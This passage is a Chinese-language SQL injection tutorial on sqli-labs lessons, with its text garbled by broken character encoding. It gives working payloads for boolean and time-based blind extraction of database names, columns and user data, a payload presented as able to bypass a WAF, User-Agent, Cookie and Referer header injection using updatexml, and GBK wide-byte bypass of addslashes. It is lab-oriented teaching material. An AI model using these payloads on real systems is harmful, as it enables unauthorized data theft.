class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>å¦‚æœå·²ç»è¯å®äº†å­˜åœ¨adminè¡¨ï¼Œé‚£ä¹ˆçŒœæµ‹æ˜¯å¦å­˜åœ¨usernameå­—æ®µ</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select username from admin) </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">1ï¼šåˆ¤æ–­è¡¨ä¸­å­—æ®µçš„ä¸ªæ•°</span></span><br><span class="line"><span class="string">//åˆ¤æ–­usersè¡¨ä¸­å­—æ®µä¸ªæ•°æ˜¯å¦å¤§äº5</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>ï¼šåˆ¤æ–­æ¯ä¸ªå­—æ®µçš„é•¿åº¦</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—æ®µçš„é•¿åº¦</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">//åˆ¤æ–­ç¬¬äºŒä¸ªå­—æ®µçš„é•¿åº¦   </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">3</span>ï¼šåˆ¤æ–­æ¯ä¸ªå­—æ®µåå­—çš„asciiå€¼</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ascii</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—æ®µçš„ç¬¬äºŒä¸ªå­—ç¬¦çš„ascii</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">ç”±æ­¤å¯åˆ¤æ–­å‡ºusersè¡¨ä¸­å­˜åœ¨ idã€usernameã€password å­—æ®µ</span><br></pre></td></tr></table></figure><p><strong>çˆ†å­—æ®µä¸­çš„æ•°æ®</strong></p><ul><li>çŒœå­—æ®µä¸­æ•°æ®çš„é•¿åº¦</li><li>çŒœå­—æ®µæ•°æ®çš„æ¯ä¸ªå­—ç¬¦asciiç  å¾—å­—ç¬¦</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬çŸ¥é“äº†usersä¸­æœ‰ä¸‰ä¸ªå­—æ®µ id ã€username ã€passwordï¼Œæˆ‘ä»¬ç°åœ¨çˆ†å‡ºæ¯ä¸ªå­—æ®µçš„æ•°æ®</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>: åˆ¤æ–­æ•°æ®çš„é•¿åº¦</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> åˆ¤æ–­idå­—æ®µçš„ç¬¬ä¸€ä¸ªæ•°æ®çš„é•¿åº¦</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select id from users limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">// åˆ¤æ–­idå­—æ®µçš„ç¬¬äºŒä¸ªæ•°æ®çš„é•¿åº¦</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>ï¼šåˆ¤æ–­æ•°æ®çš„asciiå€¼</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> åˆ¤æ–­idå­—æ®µçš„ç¬¬ä¸€è¡Œæ•°æ®çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">// åˆ¤æ–­idå­—æ®µçš„ç¬¬äºŒè¡Œæ•°æ®çš„ç¬¬äºŒä¸ªå­—ç¬¦çš„asciiå€¼</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬å¸ƒå°”ç›²æ³¨ï¼Œæ‰‹å·¥å»æ³¨å…¥è¿‡äºç¹çï¼Œä¸å»ºè®®æ‰‹å·¥æ³¨å…¥ï¼Œå¯ä»¥å€ŸåŠ©äºå·¥å…·ã€‚</p><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p> ä¹Ÿå«å»¶æ—¶æ³¨å…¥ã€‚é€šè¿‡è§‚å¯Ÿé¡µé¢ï¼Œæ—¢æ²¡æœ‰å›æ˜¾æ•°æ®åº“å†…å®¹ï¼Œåˆæ²¡æœ‰æŠ¥é”™ä¿¡æ¯ä¹Ÿæ²¡æœ‰å¸ƒå°”ç±»å‹çŠ¶æ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨â€œç»æ‹›â€â€”å»¶æ—¶æ³¨å…¥ã€‚å»¶æ—¶æ³¨å…¥å°±æ˜¯å°†é¡µé¢çš„æ—¶é—´çº¿ä½œä¸ºåˆ¤æ–­ä¾æ®ï¼Œä¸€ç‚¹ä¸€ç‚¹æ³¨å…¥å‡ºæ•°æ®åº“çš„ä¿¡æ¯ã€‚æˆ‘ä»¬ä»¥ç¬¬9å…³ä¸ºä¾‹ï¼Œåœ¨id=1åé¢åŠ å•å¼•å·æˆ–è€…åŒå¼•å·ï¼Œé¡µé¢ä¸ä¼šå‘ç”Ÿä»»ä½•æ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç»æ‹›å»¶æ—¶æ³¨å…¥ã€‚<br><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_23.png" alt=""></p><p><strong>å»¶æ—¶æ³¨å…¥</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and sleep(5) --+    </span></span><br></pre></td></tr></table></figure><p>å¦‚å›¾æ‰€ç¤ºï¼Œè§‚å¯Ÿè¯·æ±‚çš„æ—¶é—´çº¿ï¼Œå¤§æ¦‚åœ¨5ç§’ä»¥ä¸Šï¼Œè¯´æ˜æ„é€ çš„<code>sleep(5)</code> è¯­å¥èµ·ä½œç”¨ï¼Œå¯ä»¥æŠŠè¿™ä¸ªæ—¶é—´çº¿ä½œä¸ºsql æ³¨å…¥çš„åˆ¤æ–­ä¾æ®ã€‚</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_24.png" alt=""></p><p><strong>è·å–æ•°æ®åº“åå­—</strong></p><p>å»¶æ—¶æ³¨å…¥ä¸å¸ƒå°”ç›²æ³¨ç±»ä¼¼ï¼Œæ„é€ æ–¹æ³•å¦‚ä¸‹ï¼Œæäº¤å‚æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure><blockquote><p><code>if(expr1,expr2,expr3)</code>å¦‚æœexpr1çš„å€¼ä¸ºtrueï¼Œåˆ™è¿”å›expr2çš„å€¼ï¼Œå¦‚æœexpr1çš„å€¼ä¸ºfalseï¼Œåˆ™è¿”å›expr3çš„å€¼</p></blockquote><p>ä»£ç çš„å«ä¹‰å°±æ˜¯å¦‚æœæ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„acsiiå€¼ä¸º115ï¼Œåˆ™è¿›è¡Œå»¶æ—¶ï¼Œå¦åˆ™è¿”å›0å³ä»€ä¹ˆéƒ½ä¸è¿”å›</p><p>é¡µé¢æ˜¾ç¤ºå»¶æ—¶5 ç§’ï¼Œè¯´æ˜æ•°æ®åº“åå­—ç¬¬ä¸€ä¸ªå­—æ¯çš„ASCII å€¼æ˜¯115ï¼Œä¹Ÿå°±æ˜¯å­—æ¯s</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_25.png" alt=""></p><p><strong>æ•°æ®åº“åå­—ç¬¬äºŒä¸ªå­—æ¯çš„åˆ¤æ–­</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure><p>ä¸ç›²æ³¨ç±»ä¼¼ï¼Œåé¢å°±æ˜¯çŒœæ•°ï¼Œè¿™å°±æ˜¯å»¶æ—¶æ³¨å…¥</p><p>==å¯ä»¥ç»•wafçš„payload==</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">+</span>sleep(<span class="number">4</span>))a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="HTTPå¤´æ³¨å…¥"><a href="#HTTPå¤´æ³¨å…¥" class="headerlink" title="HTTPå¤´æ³¨å…¥"></a>HTTPå¤´æ³¨å…¥</h2><p>å¸¸è§çš„sqlæ³¨å…¥ä¸€èˆ¬æ˜¯é€šè¿‡è¯·æ±‚å‚æ•°æˆ–è€…è¡¨å•è¿›è¡Œæ³¨å…¥ï¼Œè€ŒHTTPå¤´éƒ¨æ³¨å…¥æ˜¯é€šè¿‡HTTPåè®®å¤´éƒ¨å­—æ®µå€¼è¿›è¡Œæ³¨å…¥ã€‚httpå¤´æ³¨å…¥å¸¸å­˜åœ¨äºä»¥ä¸‹åœ°æ–¹</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_26.png" alt=""></p><p><strong>äº§ç”Ÿæ³¨å…¥çš„æ¡ä»¶</strong>ï¼š</p><ul><li>èƒ½å¤Ÿå¯¹è¯·æ±‚å¤´æ¶ˆæ¯è¿›è¡Œä¿®æ”¹</li><li>ä¿®æ”¹çš„è¯·æ±‚å¤´ä¿¡æ¯èƒ½å¤Ÿå¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢</li><li>æ•°æ®åº“æ²¡æœ‰å¯¹è¾“å…¥çš„è¯·æ±‚ä¿¡æ¯åšè¿‡æ»¤</li></ul><p><strong>User-Agentæ³¨å…¥</strong></p><p>â€‹        User-Agentï¼šä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿè¯†åˆ«å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œæµè§ˆå™¨ç‰ˆæœ¬ç­‰ã€‚ï¼ˆå¾ˆå¤šæ•°æ®é‡å¤§çš„ç½‘ç«™ä¸­ä¼šè®°å½•å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿæˆ–æµè§ˆå™¨ç‰ˆæœ¬ç­‰ç„¶åå°†å…¶å­˜å…¥æ•°æ®åº“ä¸­ï¼‰ã€‚è¿™é‡Œè·å–User-Agentå°±å¯ä»¥çŸ¥é“å®¢æˆ·éƒ½æ˜¯é€šè¿‡ä»€ä¹ˆæµè§ˆå™¨è®¿é—®ç³»ç»Ÿçš„ï¼Œç„¶åå°†å…¶å€¼ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>ä»¥sqli-labs less-18å…³ä¸ºä¾‹ï¼Œç™»å½•ç”¨æˆ·å¯†ç ï¼šdumb/0</p><p>1.åˆ¤æ–­æ³¨å…¥ç‚¹ï¼šuser-agentå€¼åé¢åŠ ä¸Š<code>&#39;</code>ï¼Œå¼•å‘æŠ¥é”™ï¼Œç¡®å®šå­˜åœ¨sqlæ³¨å…¥</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_27.png" alt=""></p><p>2.é‡‡ç”¨æŠ¥é”™æ³¨å…¥å‡½æ•°è·å–å½“å‰æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) and &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_28.png" alt=""></p><p><strong>cookieæ³¨å…¥</strong></p><p> cookieï¼šæœåŠ¡å™¨ç«¯ç”¨æ¥è®°å½•å®¢æˆ·ç«¯çš„çŠ¶æ€ã€‚ç”±æœåŠ¡ç«¯äº§ç”Ÿï¼Œä¿å­˜åœ¨æµè§ˆå™¨ä¸­,ä»¥sqli-labs less-20å…³ä¸ºä¾‹ï¼Œç™»å½•å</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_29.png" alt=""></p><p>\1. é¦–å…ˆåˆ¤æ–­æ³¨å…¥ç‚¹ï¼ŒåŠ  â€˜ å•å¼•å·æŠ¥é”™</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_30.png" alt=""></p><p>\2. é‡‡ç”¨æŠ¥é”™æ³¨å…¥å‡½æ•°è·å–å½“å‰æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) and &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_31.png" alt=""><strong>Refereræ³¨å…¥</strong></p><p> <strong>Refererï¼š</strong>æ˜¯HTTP headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†</p><p>ä»¥19å…³ä¸ºä¾‹</p><p>1. åˆ¤æ–­è¾“å…¥ç‚¹ï¼ŒåŠ å•å¼•å·å¼•å‘æŠ¥é”™</p><p>2. ä½¿ç”¨æŠ¥é”™æ³¨å…¥å‡½æ•°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€˜ <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_32.png" alt=""></p><p>æ–¹æ³•éƒ½æ˜¯ä¸€æ ·çš„</p><p><strong>X-Forwarded-For æ³¨å…¥</strong></p><p><code>X-Forwarded-For(XFF)</code>ï¼šç”¨æ¥è¯†åˆ«å®¢æˆ·ç«¯æœ€åŸå§‹çš„ipåœ°å€</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_44159028/article/details/112528864?ops_request_misc=%7B%22request%5Fid%22%3A%22161646592716780261962393%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=161646592716780261962393&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-112528864.pc_v1_rank_blog_v1&amp;utm_term=X-for">X-Forwarded-For</a></p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p><strong>å®½å­—èŠ‚æ¡ˆä¾‹å¼•å…¥</strong>  </p><p>å®½å­—èŠ‚æ³¨å…¥å‡†ç¡®æ¥è¯´ä¸æ˜¯æ³¨å…¥æ‰‹æ³•ï¼Œè€Œæ˜¯å¦å¤–ä¸€ç§æ¯”è¾ƒç‰¹æ®Šçš„æƒ…å†µã€‚ä¸ºäº†è¯´æ˜å®½å­—èŠ‚æ³¨å…¥é—®é¢˜ï¼Œæˆ‘ä»¬ä»¥SQLi-labs 32 å…³ä¸ºä¾‹å­ã€‚ ä½¿ç”¨<code>?id=1&#39;</code> è¿›è¡Œæµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°æäº¤çš„å•å¼•å·ä¼šè¢«è½¬ä¹‰<code>[\&#39;]</code>ï¼Œæ­¤æ—¶ï¼Œè½¬ä¹‰åçš„å•å¼•å·ä¼šè¢«ä½œä¸ºæ™®é€šå­—ç¬¦å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æäº¤çš„å•å¼•å·ä¸ä¼šå½±å“åˆ°åŸæ¥SQL è¯­å¥çš„ç»“æ„</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_33.png" alt=""></p><p>æ¥ç€æˆ‘ä»¬æŸ¥çœ‹è¿™å…³çš„æºç ï¼Œå‘ç°ä¼ å…¥çš„idç»è¿‡addslashesè½¬ç§»å‡½æ•°çš„å¤„ç†ï¼Œæ‰€æœ‰çš„å•å¼•å·åŒå¼•å·å­—ç¬¦éƒ½ä¼šè¢«æ·»åŠ è½¬ä¹‰å­—ç¬¦ã€‚æ¥ç€åœ¨å¸¦å…¥åˆ°æ•°æ®åº“æŸ¥è¯¢å‰è®¾ç½®äº†<code>mysql_query(&quot;SET NAMES gbk&quot;)</code>ï¼Œå³è®¾å®šå­—ç¬¦é›†ä¸ºgbkã€‚æ¼æ´å°±æ˜¯ç”±äºè¿™ä¸ªè®¾ç½®å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_34.png" alt=""></p><p>ä»”ç»†çœ‹è¯¥å‡½æ•°ï¼Œå…¶åˆ©ç”¨æ­£åˆ™åŒ¹é…å°† <code>[/ï¼Œ&#39;ï¼Œ&quot;]</code>è¿™äº›ä¸‰ä¸ªç¬¦å·éƒ½è¿‡æ»¤æ‰äº†</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_35.png" alt=""></p><p>è€Œæˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªè½¬ä¹‰å¤„ç†ï¼Œä½¿å•å¼•å·å‘æŒ¥ä½œç”¨ä¸å†è¢«è½¬ä¹‰ï¼Œæœ‰ä¸¤ä¸ªæ€è·¯ï¼š</p><ul><li>è®©æ–œæ <code>\</code>å¤±å»ä½œç”¨</li><li>è®©æ–œæ <code>\</code>æ¶ˆå¤±</li></ul><p>ç¬¬ä¸€ä¸ªæ€è·¯å°±æ˜¯å€Ÿé‰´ç¨‹åºå‘˜çš„é˜²èŒƒæ€è·¯ï¼Œå¯¹æ–œæ <code>\</code>è½¬ä¹‰ï¼Œä½¿å…¶å¤±å»è½¬ä¹‰å•å¼•å·çš„ä½œç”¨ï¼Œæˆä¸ºæ™®é€šçš„å†…å®¹</p><p>ç¬¬äºŒä¸ªæ€è·¯å°±æ˜¯å®½å­—èŠ‚æ³¨å…¥</p><p><strong>å…³äºç¼–ç </strong></p><ul><li>æŸå­—ç¬¦çš„å¤§å°ä¸ºä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œç§°å…¶å­—ç¬¦ä¸ºçª„å­—èŠ‚.</li><li>å½“æŸå­—ç¬¦çš„å¤§å°ä¸ºä¸¤ä¸ªå­—èŠ‚æ—¶ï¼Œç§°å…¶å­—ç¬¦ä¸ºå®½å­—èŠ‚.</li><li>æ‰€æœ‰è‹±æ–‡é»˜è®¤å ä¸€ä¸ªå­—èŠ‚ï¼Œæ±‰å­—å ä¸¤ä¸ªå­—èŠ‚</li><li>å¸¸è§çš„å®½å­—èŠ‚ç¼–ç ï¼šGB2312,GBK,GB18030,BIG5,Shift_JISç­‰ç­‰</li></ul><p><strong>å®½å­—èŠ‚æ³¨å…¥</strong></p><p>å®½å­—èŠ‚æ˜¯æŒ‡å¤šä¸ªå­—èŠ‚å®½åº¦çš„ç¼–ç ï¼ŒGB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚è½¬ä¹‰å‡½æ•°åœ¨å¯¹è¿™äº›ç¼–ç è¿›è¡Œè½¬ä¹‰æ—¶ä¼šå°†è½¬ä¹‰å­—ç¬¦ <code>\</code> è½¬ä¸º<code>%5c</code> ,äºæ˜¯æˆ‘ä»¬åœ¨ä»–å‰é¢è¾“å…¥ä¸€ä¸ªå•å­—ç¬¦ç¼–ç ä¸å®ƒç»„æˆä¸€ä¸ªæ–°çš„å¤šå­—ç¬¦ç¼–ç ï¼Œä½¿å¾—åŸæœ¬çš„è½¬ä¹‰å­—ç¬¦æ²¡æœ‰å‘ç”Ÿä½œç”¨ã€‚</p><p>ç”±äºåœ¨æ•°æ®åº“æŸ¥è¯¢å‰ä½¿ç”¨äº†GBKå¤šå­—èŠ‚ç¼–ç ï¼Œå³åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚ä¼šè¢«ç¼–ç ä¸ºä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚ç„¶åmysqlæœåŠ¡å™¨ä¼šå¯¹æŸ¥è¯¢è¯­å¥è¿›è¡ŒGBKç¼–ç ï¼Œå³ä¸‹é¢æ‰€è¯´çš„</p><p>æˆ‘ä»¬åœ¨å‰é¢åŠ ä¸Š<code>%df&#39;</code>  ,è½¬ä¹‰å‡½æ•°ä¼šå°†<code>%df&#39;</code>æ”¹æˆ<code>%df\&#39;</code> , è€Œ\ å°±æ˜¯<code>%5c</code> ï¼Œå³æœ€åå˜æˆäº†<code>%df%5c&#39;</code>ï¼Œ è€Œ<code>%df%5c</code>åœ¨GBKä¸­è¿™ä¸¤ä¸ªå­—èŠ‚å¯¹åº”ç€ä¸€ä¸ªæ±‰å­— <code>é‹</code> ï¼Œå°±æ˜¯è¯´<code>\</code>å·²ç»å¤±å»äº†ä½œç”¨ï¼Œ<code>%df&#39;</code> ,è¢«è®¤ä¸º<code>é‹&#39;</code> ,æˆåŠŸæ¶ˆé™¤äº†è½¬ä¹‰å‡½æ•°çš„å½±å“</p><ul><li><code>&#39;</code> %27</li><li><code>\</code> %5c</li><li><code>%df\&#39;</code> <code>%df%5c&#39;</code>  <code>é‹&#39;</code></li></ul><p>æˆ‘ä»¬è¾“å…¥<code>?id=1%df&#39;</code>ï¼ŒæŒ‰é“ç†æ¥è¯´å°†è½¬ä¹‰ç¬¦åƒæ‰äº†ï¼Œç»“æœåº”è¯¥æ˜¯<code>id=&#39; é‹&#39;  &#39;</code>ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè½¬å˜æˆäº†ä¸­æ–‡ååé¢è¿˜æœ‰ä¸€ä¸ªåæ–œæ äº†ï¼Ÿé‚£ä¸ªåæ–œæ æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿ</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_36.png" alt=""></p><p>å…¶å®è¿™ä¸ªæ˜¯æµè§ˆå™¨æ˜¾ç¤ºç¼–ç çš„é—®é¢˜ï¼Œæˆ‘ä»¬å°†æµè§ˆå™¨ç¼–ç åˆ‡æ¢ä¸ºGB2312å³ç®€ä½“ä¸­æ–‡ï¼Œå°±æ­£å¸¸äº†</p><p> è”åˆæ³¨å…¥å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="operator">%</span>df<span class="string">&#x27; order by 4 --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_37.png" alt=""></p><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>åœ¨SQLä¸­ï¼Œåˆ†å·<code>;</code>æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion 